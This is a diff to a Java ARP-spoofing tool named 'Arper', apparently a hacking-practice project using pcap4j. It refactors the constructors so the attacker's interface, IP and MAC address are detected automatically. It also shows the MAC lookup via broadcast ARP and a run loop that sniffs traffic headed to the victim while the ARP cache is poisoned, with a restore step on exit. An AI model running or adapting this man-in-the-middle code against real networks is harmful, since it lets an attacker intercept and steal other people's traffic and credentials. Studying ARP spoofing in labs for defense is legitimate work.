@@ -23,40 +23,28 @@ public class Arper {
     private MacAddress attackerMac;
     private MacAddress gatewayMac;
     private MacAddress targetMac;
+    private PcapNetworkInterface nif;
 
-    public Arper() {
-    }
-
-    public Arper(String attackerIP, MacAddress attackerMac) {
-        this.attackerIP = attackerIP;
-        this.attackerMac = attackerMac;
+    public Arper(String targetIP, String gatewayIP) {
+        configure(targetIP, gatewayIP);
     }
 
     public Arper(String attackerIP, MacAddress attackerMac, MacAddress targetMac, MacAddress gatewayMac) {
-        this(attackerIP, attackerMac);
-
+        this.attackerIP = attackerIP;
+        this.attackerMac = attackerMac;
         this.targetMac = targetMac;
         this.gatewayMac = gatewayMac;
     }
 
-    public Arper(String attackerIP, MacAddress attackerMac, String targetIP, String gatewayIP) {
-        this(attackerIP, attackerMac);
-        this.targetIP = targetIP;
-        this.gatewayIP = gatewayIP;
-
-        this.targetMac = getMac(targetIP);
-        this.gatewayMac = getMac(gatewayIP);
-    }
-
     public void run() {
-        PcapNetworkInterface nif = NetworkUtils.selectNetWorkInterface();
-        Sniff sniff = new Sniff(nif);
-        sniff.setFilter("dst host " + targetIP);
 
         summary();
 
-        Utils.sleep(2000);
+        Sniff sniff = new Sniff(nif);
+        sniff.setFilter("dst host " + targetIP);
+
         System.out.println("Running...");
+        Utils.sleep(2000);
 
         while (true) {
             try {
@@ -75,22 +63,6 @@ public class Arper {
         System.out.println("Restoring...\n");
         restore(gatewayIP, targetIP);
 
-    }
-
-    private void summary() {
-        System.out.println("Summary: ");
-        System.out.printf("src HAddr: %s", this.attackerMac);
-        System.out.println();
-        System.out.printf("src IP: %s", this.attackerIP);
-        System.out.println();
-        System.out.printf("gateway HAddr: %s", this.gatewayMac);
-        System.out.println();
-        System.out.printf("gateway IP: %s", this.gatewayIP);
-        System.out.println();
-        System.out.printf("target HAddr: %s", this.targetMac);
-        System.out.println();
-        System.out.printf("target IP: %s", this.targetIP);
-        System.out.println();
     }
 
     private void poison(String gatewayIP, String targetIP) {
@@ -128,17 +100,27 @@ public class Arper {
         }
     }
 
-    private MacAddress getMac(String targetIP) {
+    private void configure(String targetIP, String gatewayIP) {
+        this.nif = NetworkUtils.selectNetWorkInterface();
+        this.attackerIP = nif.getAddresses().get(0).getAddress().getHostAddress();
+        this.attackerMac = MacAddress.getByAddress(nif.getLinkLayerAddresses().get(0).getAddress());
+        this.targetIP = targetIP;
+        this.targetMac = getMac(targetIP);
+        this.gatewayIP = gatewayIP;
+        this.gatewayMac = getMac(gatewayIP);
+    }
+
+    private MacAddress getMac(String ipAddr) {
         PcapHandle handle;
         try {
             handle = NetworkUtils.createPcapHandle(attackerIP);
-            handle.setFilter("arp and src host " + targetIP,
+            handle.setFilter("arp and src host " + ipAddr,
                     BpfCompileMode.OPTIMIZE);
 
             EthernetPacket arpPckt = buildArpPacket(
                     attackerIP,
                     attackerMac,
-                    targetIP,
+                    ipAddr,
                     MacAddress.ETHER_BROADCAST_ADDRESS);
 
             handle.sendPacket(arpPckt);
@@ -169,6 +151,22 @@ public class Arper {
         EthernetPacket packet = frame.getFrame().build();
 
         return packet;
+    }
+
+    private void summary() {
+        System.out.println("Summary: ");
+        System.out.printf("src HAddr: %s", this.attackerMac);
+        System.out.println();
+        System.out.printf("src IP: %s", this.attackerIP);
+        System.out.println();
+        System.out.printf("gateway HAddr: %s", this.gatewayMac);
+        System.out.println();
+        System.out.printf("gateway IP: %s", this.gatewayIP);
+        System.out.println();
+        System.out.printf("target HAddr: %s", this.targetMac);
+        System.out.println();
+        System.out.printf("target IP: %s", this.targetIP);
+        System.out.println();
     }
 
 }
